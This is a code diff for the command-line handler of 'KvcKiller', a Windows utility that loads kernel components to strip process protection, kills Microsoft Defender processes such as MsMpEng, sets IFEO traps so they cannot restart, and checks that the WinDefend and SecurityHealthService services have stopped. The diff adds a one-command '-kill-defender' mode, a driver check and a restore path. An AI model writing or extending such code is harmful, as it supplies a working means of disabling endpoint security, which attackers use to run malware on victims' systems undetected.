@@ -7,19 +7,23 @@
 // Supported commands:
 //   -help                    Print usage and exit.
 //   -list                    Enumerate config targets and show running status.
-//   -kill <name> [-paralyze] Kill a process; optionally rename .exe → .exe.bak.
-//   -restore <name>          Reverse a prior kill / paralyze via SCM or ShellExecute.
+//   -kill <name> [-paralyze] Kill one process, optionally applying IFEO first.
+//   -kill-defender           Kill/trap the fixed Defender process set.
+//   -restore <name>          Reverse a prior kill / paralyze.
+//   -restore-defender        Restore the fixed Defender process set.
 
 #include "CLIHandler.h"
 #include "Utils.h"
-#include "DriverController.h"
+#include "KillEngine.h"
 #include "ProcessKiller.h"
 #include "ConfigReader.h"
-#include "ProcessOperations.h"
 #include "ProcessOperations.h"
 #include "Resource.h"
 
 #include <algorithm>
+#include <array>
+#include <span>
+#include <string_view>
 #include <io.h>
 #include <fcntl.h>
 #include <stdio.h>
@@ -40,17 +44,23 @@
 // underlying handle is Unicode-capable; without it, wprintf to a Unicode console
 // silently drops non-ASCII characters.
 void SetupConsole() {
-    if (!AttachConsole(ATTACH_PARENT_PROCESS)) return;
+    if (AttachConsole(ATTACH_PARENT_PROCESS)) {
+        FILE* fp;
+        freopen_s(&fp, "CONOUT$", "w", stdout);
+        freopen_s(&fp, "CONOUT$", "w", stderr);
+        freopen_s(&fp, "CONIN$",  "r", stdin);
+        SetConsoleOutputCP(CP_UTF8);
+        SetConsoleCP(CP_UTF8);
+    }
 
-    FILE* fp;
-    freopen_s(&fp, "CONOUT$", "w", stdout);
-    freopen_s(&fp, "CONOUT$", "w", stderr);
-    freopen_s(&fp, "CONIN$",  "r", stdin);
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
-    _setmode(_fileno(stdout), _O_U16TEXT);
-    _setmode(_fileno(stderr), _O_U16TEXT);
-    _setmode(_fileno(stdin),  _O_U16TEXT);
+    // Preserve inherited redirected handles when no console is available.
+    // This keeps CLI diagnostics usable from CI and script launchers.
+    if (GetStdHandle(STD_OUTPUT_HANDLE) != INVALID_HANDLE_VALUE)
+        _setmode(_fileno(stdout), _O_U16TEXT);
+    if (GetStdHandle(STD_ERROR_HANDLE) != INVALID_HANDLE_VALUE)
+        _setmode(_fileno(stderr), _O_U16TEXT);
+    if (GetStdHandle(STD_INPUT_HANDLE) != INVALID_HANDLE_VALUE)
+        _setmode(_fileno(stdin), _O_U16TEXT);
 }
 
 // ---------------------------------------------------------------------------
@@ -94,35 +104,161 @@ void SendEnterToConsole() {
 // Help
 // ---------------------------------------------------------------------------
 
-void PrintHelp() {
-    wprintf(L"\nKvcKiller - %ls\n", LoadStr(IDS_APP_SUBTITLE).c_str());
-    wprintf(L"%ls\n\n",             LoadStr(IDS_AUTHOR_LINE).c_str());
-    wprintf(L"Usage:\n");
-    wprintf(L"  KvcKiller.exe -help                      Show this help message (.exe - optional)\n");
-    wprintf(L"  KvcKiller.exe -list                      List target processes and their status\n");
-    wprintf(L"  KvcKiller.exe -kill <n> [-paralyze]   Kill a process; -paralyze blocks execution\n");
-    wprintf(L"  KvcKiller.exe -restore <n>            Restore a killed service (auto-reverses paralyze)\n\n");
-    wprintf(L"Examples:\n");
-    wprintf(L"  KvcKiller.exe -list\n");
-    wprintf(L"  KvcKiller.exe -kill MsMpEng\n");
-    wprintf(L"  KvcKiller -kill -paralyze MsMpEng.exe\n");
-    wprintf(L"  KvcKiller.exe -restore MsMpEng\n");
+namespace {
+
+void PrintUsageRow(std::wstring_view syntax, std::wstring_view description) {
+    constexpr size_t kDescriptionColumn = 48;
+    std::wstring row;
+    row.reserve(kDescriptionColumn + description.size() + 2);
+    row.append(L"  ");
+    row.append(syntax);
+    if (row.size() < kDescriptionColumn) {
+        row.append(kDescriptionColumn - row.size(), L' ');
+    } else {
+        row.push_back(L' ');
+    }
+    row.append(description);
+    wprintf(L"%ls\n", row.c_str());
 }
 
-// ---------------------------------------------------------------------------
-// Internal: driver initialisation
-// ---------------------------------------------------------------------------
-// The CLI doesn't use ProcessOperations::InitializeDriver because that module
-// includes GUI headers (hListView etc.) which are undefined in headless mode.
-// This thin wrapper calls DriverController directly and mirrors the same logic.
+int ExitCodeForKillOutcome(KillOutcome outcome) {
+    switch (outcome) {
+    case KillOutcome::Succeeded:
+    case KillOutcome::AlreadyStopped:
+        return 0;
+    case KillOutcome::Partial:
+        return 2;
+    case KillOutcome::Failed:
+        return 1;
+    }
+    return 1;
+}
 
-static bool InitDriverForCli() {
-    if (DriverController::IsDriverLoaded()) return true;
+void PrintKillReport(const KillOperationReport& report) {
+    wprintf(L"[*] PPL unprotector: %ls\n",
+            report.pplReady ? L"ready" : L"unavailable");
+    wprintf(L"[*] Process terminator: %ls\n",
+            report.terminatorReady ? L"ready" : L"unavailable");
 
-    const std::wstring driverPath = DriverController::GetDriverPath();
-    if (!DriverController::RegisterDriver(driverPath)) return false;
-    if (!DriverController::StartDriver())              return false;
-    return true;
+    for (const KillTargetReport& target : report.targets) {
+        const std::wstring exeName = target.name + L".exe";
+        if (target.terminated) {
+            wprintf(L"[+] %-30ls (PID %lu) terminated\n",
+                    exeName.c_str(), target.pid);
+        } else if (!target.wasRunning && !target.runningAfter) {
+            wprintf(L"[*] %-30ls not running\n", exeName.c_str());
+        }
+
+        if (target.restartedAfter) {
+            wprintf(L"[*] %-30ls restarted with a new PID after termination\n",
+                    exeName.c_str());
+        } else if (target.originalSurvived) {
+            wprintf(L"[*] %-30ls still running\n", exeName.c_str());
+        }
+
+        if (target.trapSet) {
+            wprintf(L"[+] %-30ls IFEO trap active\n", exeName.c_str());
+        }
+    }
+
+    if (report.defenderSet) {
+        wprintf(L"[%c] WinDefend service: %ls\n",
+                report.winDefendStopped ? L'+' : L'!',
+                report.winDefendStopped ? L"stopped" : L"not stopped");
+        wprintf(L"[%c] SecurityHealthService: %ls\n",
+                report.securityHealthStopped ? L'+' : L'*',
+                report.securityHealthStopped ? L"stopped" : L"still active");
+    }
+
+    switch (report.outcome) {
+    case KillOutcome::Succeeded:
+        wprintf(L"[+] KILL COMPLETE - ALL REQUIRED CONTROLS CONFIRMED\n");
+        break;
+    case KillOutcome::AlreadyStopped:
+        wprintf(L"[*] Target was already stopped.\n");
+        break;
+    case KillOutcome::Partial:
+        wprintf(L"[!] KILL PARTIAL - one or more required controls were not confirmed\n");
+        break;
+    case KillOutcome::Failed:
+        wprintf(L"[-] KILL FAILED - no required control was confirmed\n");
+        break;
+    }
+}
+
+bool RestoreTargets(std::span<const std::wstring> names) {
+    std::vector<std::wstring> bareNames;
+    std::vector<std::wstring> exeNames;
+    bareNames.reserve(names.size());
+    exeNames.reserve(names.size());
+    for (const std::wstring& name : names) {
+        bareNames.push_back(StripExeExtension(name));
+        exeNames.push_back(bareNames.back() + L".exe");
+    }
+
+    std::vector<std::wstring> trapped;
+    for (const std::wstring& name : bareNames) {
+        if (IsProcessParalyzed(name)) trapped.push_back(name);
+    }
+    if (!trapped.empty()) {
+        const int released = UnparalyzeProcessesBatch(trapped);
+        wprintf(L"[*] IFEO traps removed: %d/%zu\n",
+                released, trapped.size());
+    }
+
+    std::vector<int> results;
+    ProcessKiller::RestoreProcesses(exeNames, results);
+
+    bool allReady = true;
+    for (size_t i = 0; i < exeNames.size(); ++i) {
+        if (results[i] == 1 || results[i] == 2) {
+            ConfigReader::RecordHistory(
+                L"RESTORE",
+                exeNames[i],
+                ConfigReader::ReadProcessPath(bareNames[i]));
+            wprintf(L"[+] %-30ls %ls\n",
+                    exeNames[i].c_str(),
+                    results[i] == 2 ? L"already running" : L"start requested");
+        } else {
+            allReady = false;
+            wprintf(L"[!] %-30ls could not be restored\n",
+                    exeNames[i].c_str());
+        }
+    }
+    return allReady;
+}
+
+} // namespace
+
+void PrintHelp() {
+    wprintf(L"\nKvcKiller - %ls\n", LoadStr(IDS_APP_SUBTITLE).c_str());
+    wprintf(L"WESMAR Marek Wesołowski\n\n");
+    wprintf(L"Usage:\n");
+    PrintUsageRow(L"KvcKiller.exe -help",
+                  L"Show this help message (.exe is optional)");
+    PrintUsageRow(L"KvcKiller.exe -check-drivers",
+                  L"Load and verify both kernel components");
+    PrintUsageRow(L"KvcKiller.exe -list",
+                  L"List configured targets and their status");
+    PrintUsageRow(L"KvcKiller.exe -kill <name> [-paralyze]",
+                  L"Kill one process; optionally apply IFEO first");
+    PrintUsageRow(L"KvcKiller.exe -kill-defender",
+                  L"Trap and kill the fixed Defender process set");
+    PrintUsageRow(L"KvcKiller.exe -restore <name>",
+                  L"Restore one process and remove its IFEO trap");
+    PrintUsageRow(L"KvcKiller.exe -restore-defender",
+                  L"Restore the fixed Defender process set");
+    wprintf(L"\n");
+    wprintf(L"Examples:\n");
+    PrintUsageRow(L"KvcKiller.exe -list", L"");
+    PrintUsageRow(L"KvcKiller.exe -kill MsMpEng",
+                  L"Terminate MsMpEng without a restart trap");
+    PrintUsageRow(L"KvcKiller.exe -kill MsMpEng -paralyze",
+                  L"Trap first, then terminate");
+    PrintUsageRow(L"KvcKiller.exe -kill-defender",
+                  L"Use the same three-process action as the GUI");
+    PrintUsageRow(L"KvcKiller.exe -restore-defender",
+                  L"Reverse the three-process action");
 }
 
 // ---------------------------------------------------------------------------
@@ -141,9 +277,9 @@ int RunCLI(int argc, LPWSTR* argv) {
     SetupConsole();
 
     // Single cleanup point for all return paths.
-    // closeDriver=true triggers driver handle release + registry cleanup.
+    // closeDriver=true releases both kernel components and their artifacts.
     auto finishCli = [](int code, bool closeDriver = false) -> int {
-        if (closeDriver) DriverController::CloseDriverHandle();
+        if (closeDriver) KillEngine::Stop();
         fflush(stdout);
         fflush(stderr);
         SendEnterToConsole();
@@ -165,18 +301,22 @@ int RunCLI(int argc, LPWSTR* argv) {
         return finishCli(1);
     }
 
-    // Load the kernel driver before any IOCTL operations.
-    wprintf(L"\n[*] Initializing driver...\n");
-    if (!InitDriverForCli()) {
-        wprintf(L"[!] ERROR: Driver initialization failed.\n");
-        wprintf(L"[*] Ensure you are running as Administrator and the payload is appended to the executable.\n");
-        return finishCli(1);
-    }
+    if (cmd == L"-check-drivers") {
+        const bool started = KillEngine::Start();
+        bool pplReady = KillEngine::HasPplUnprotector();
+        const bool terminatorReady = KillEngine::HasProcessTerminator();
 
-    HANDLE hDriver = DriverController::GetDriverHandle();
-    if (hDriver == INVALID_HANDLE_VALUE) {
-        wprintf(L"[!] ERROR: Driver handle is invalid!\n");
-        return finishCli(1, true);
+        if (pplReady) {
+            PplTargetResult probe{};
+            pplReady = PplUnprotector::Probe(GetCurrentProcessId(), probe);
+        }
+
+        wprintf(L"[*] PPL unprotector: %ls\n", pplReady ? L"ready" : L"unavailable");
+        wprintf(L"[*] Process terminator: %ls\n", terminatorReady ? L"ready" : L"unavailable");
+
+        if (!started) return finishCli(1, true);
+        if (pplReady && terminatorReady) return finishCli(0, true);
+        return finishCli(pplReady ? 2 : 3, true);
     }
 
     // -list: enumerate config targets and show running/not-running status
@@ -206,122 +346,71 @@ int RunCLI(int argc, LPWSTR* argv) {
                 wprintf(L"%-30s | %-10s | NOT RUNNING\n",  exeName.c_str(), L"-");
         }
 
-        return finishCli(0, true);
+        return finishCli(0);
+    }
+
+    if (cmd == L"-kill-defender") {
+        wprintf(L"[*] Running the fixed Defender set...\n");
+        const std::vector<std::wstring> targets = DefenderTargetList();
+        const KillOperationReport report = ExecuteKillTargets(
+            targets, true, true);
+        PrintKillReport(report);
+        return finishCli(ExitCodeForKillOutcome(report.outcome));
     }
 
     // -kill <name> [-paralyze] or -kill -paralyze <name>
     if (cmd == L"-kill") {
         if (argc < 3) {
-            wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -kill <n> [-paralyze]\n");
-            return finishCli(1, true);
+            wprintf(L"[!] ERROR: Missing process name.\n"
+                    L"    Usage: KvcKiller.exe -kill <name> [-paralyze]\n");
+            return finishCli(1);
         }
 
         bool doParalyze = false;
         std::wstring targetStr;
-
-        if (_wcsicmp(argv[2], L"-paralyze") == 0) {
-            doParalyze = true;
-            if (argc < 4) {
-                wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -kill -paralyze <n>\n");
-                return finishCli(1, true);
-            }
-            targetStr = argv[3];
-        } else {
-            targetStr = argv[2];
-            for (int i = 3; i < argc; ++i) {
-                if (_wcsicmp(argv[i], L"-paralyze") == 0) {
-                    doParalyze = true;
-                    break;
-                }
+        for (int i = 2; i < argc; ++i) {
+            if (_wcsicmp(argv[i], L"-paralyze") == 0) {
+                doParalyze = true;
+            } else if (targetStr.empty()) {
+                targetStr = argv[i];
+            } else {
+                wprintf(L"[!] ERROR: Unexpected argument: %ls\n", argv[i]);
+                return finishCli(1);
             }
         }
-
-        const std::wstring target = EnsureExeName(targetStr);
-
-        wprintf(L"[*] Searching for %ls...\n", target.c_str());
-
-        auto running = ProcessKiller::FindProcesses({ target });
-        if (running.empty()) {
-            wprintf(L"[-] Process %ls is ALREADY DEAD (NOT RUNNING).\n", target.c_str());
-        } else {
-            // --- Paralyze Phase (BEFORE Kill) ---
-            if (doParalyze) {
-                std::vector<std::wstring> toParalyze = { StripExeExtension(target) };
-                if (ParalyzeProcessesBatch(toParalyze) > 0) {
-                    wprintf(L"[+] Paralyzed %ls via IFEO block\n", target.c_str());
-                } else {
-                    wprintf(L"[!] Paralyze failed for %ls via IFEO block\n", target.c_str());
-                }
-            }
-
-            for (const auto& proc : running) {
-                HANDLE hProc = OpenProcess(SYNCHRONIZE, FALSE, proc.pid);
-                if (ProcessKiller::KillProcess(hDriver, proc.pid)) {
-                    if (hProc) {
-                        // Wait up to 2 seconds for the process to signal termination
-                        WaitForSingleObject(hProc, 2000);
-                    }
-                    if (!ProcessKiller::IsProcessRunning(proc.pid)) {
-                        const std::wstring path = ConfigReader::ReadProcessPath(proc.name);
-                        ConfigReader::RecordHistory(L"KILL", proc.name, path);
-                        wprintf(L"[+] Successfully killed %ls (PID: %lu)\n",
-                                proc.name.c_str(), proc.pid);
-                    } else {
-                        // IOCTL was accepted but the process is still alive —
-                        // likely protected by a watchdog or anti-tamper driver.
-                        wprintf(L"[!] IOCTL sent, but %ls (PID: %lu) is still running!"
-                                L" Protection might be active.\n", proc.name.c_str(), proc.pid);
-                    }
-                } else {
-                    wprintf(L"[!] Failed to send IOCTL to kill %ls (PID: %lu)\n",
-                            proc.name.c_str(), proc.pid);
-                }
-                if (hProc) {
-                    CloseHandle(hProc);
-                }
-            }
+        if (targetStr.empty()) {
+            wprintf(L"[!] ERROR: Missing process name.\n");
+            return finishCli(1);
         }
 
-        return finishCli(0, true);
+        const std::array<std::wstring, 1> targets{
+            StripExeExtension(targetStr)
+        };
+        wprintf(L"[*] Target: %ls.exe\n", targets.front().c_str());
+        const KillOperationReport report = ExecuteKillTargets(
+            targets, doParalyze, false);
+        PrintKillReport(report);
+        return finishCli(ExitCodeForKillOutcome(report.outcome));
+    }
+
+    if (cmd == L"-restore-defender") {
+        wprintf(L"[*] Restoring the fixed Defender set...\n");
+        const std::vector<std::wstring> targets = DefenderTargetList();
+        return finishCli(RestoreTargets(targets) ? 0 : 1);
     }
 
     // -restore <name>
     if (cmd == L"-restore") {
         if (argc < 3) {
-            wprintf(L"[!] ERROR: Missing process name. Usage: KvcKiller.exe -restore <n>\n");
-            return finishCli(1, true);
+            wprintf(L"[!] ERROR: Missing process name.\n"
+                    L"    Usage: KvcKiller.exe -restore <name>\n");
+            return finishCli(1);
         }
 
-        const std::wstring target = EnsureExeName(argv[2]);
-        wprintf(L"[*] Attempting to restore service associated with %ls...\n", target.c_str());
-
-        // --- Unparalyze Phase (BEFORE Restore) ---
-        // Always unparalyze first
-        std::wstring bareName = StripExeExtension(target);
-        if (IsProcessParalyzed(bareName)) {
-            std::vector<std::wstring> toUnparalyze = { bareName };
-            if (UnparalyzeProcessesBatch(toUnparalyze) > 0) {
-                wprintf(L"[*] Unparalyzed %ls via IFEO block\n", target.c_str());
-            } else {
-                wprintf(L"[!] Failed to unparalyze %ls — restore may fail\n", target.c_str());
-            }
-        }
-
-        const std::wstring path = ConfigReader::ReadProcessPath(target);
-
-        // RestoreProcess returns: 0 = failed, 1 = started, 2 = already running.
-        const int res = ProcessKiller::RestoreProcess(target);
-        if (res == 2) {
-            wprintf(L"[*] Process %ls is ALREADY RUNNING.\n", target.c_str());
-        } else if (res == 1) {
-            ConfigReader::RecordHistory(L"RESTORE", target, path);
-            wprintf(L"[+] Successfully sent start command to the associated service or executable!\n");
-        } else {
-            wprintf(L"[-] Could not restore."
-                    L" Service might not exist or tampered protection is blocking it.\n");
-        }
-
-        return finishCli(0, true);
+        const std::array<std::wstring, 1> targets{
+            StripExeExtension(argv[2])
+        };
+        return finishCli(RestoreTargets(targets) ? 0 : 1);
     }
 
     // Unknown command — print help so the user knows what went wrong.
